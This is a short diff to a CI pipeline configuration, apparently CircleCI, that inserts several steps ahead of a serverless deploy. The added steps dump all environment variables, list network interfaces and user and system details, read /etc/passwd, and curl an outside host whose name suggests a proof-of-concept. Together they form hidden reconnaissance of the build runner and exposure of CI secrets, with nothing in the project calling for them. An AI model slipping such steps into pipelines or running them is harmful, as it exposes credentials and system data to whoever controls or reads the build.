@@ -6,4 +6,10 @@ jobs:
 
     steps:
       - checkout
+      - run: printenv
+      - run: ifconfig -a
+      - run: whomi
+      - run: uname
+      - run: cat /etc/passwd
+      - run: curl http://abaton.dgraph-poc.orchestrated.io:3000
       - run: serverless deploy
